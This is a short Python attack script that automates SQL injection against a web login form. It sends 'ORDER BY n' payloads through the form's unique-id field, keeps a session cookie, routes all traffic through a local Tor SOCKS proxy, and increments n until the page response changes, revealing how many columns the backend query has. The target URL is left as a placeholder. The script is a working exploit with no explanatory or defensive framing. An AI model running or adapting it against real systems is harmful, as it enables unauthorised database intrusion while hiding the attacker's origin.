import time
import requests

url = "--target--"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
#DO NOT CHANGE THIS PART


isTableFinished = False

correct = 'Q'
count = 2

while True:
    injection = "a' ORDER BY "+str(count)+"; -- "
    response = requests.post(
        url,
        cookies=cookies,
        data={
        'input_unique_id': injection,
        'input_pass': 'a',
        'btn_login': 'Submit',
        },
        verify=False,
        proxies=prox
    )

    #print(response.text)
    time.sleep(0.3)

    if response.text[12]==correct:
        print("correct, count = "+str(count-1))
        break
    count += 1



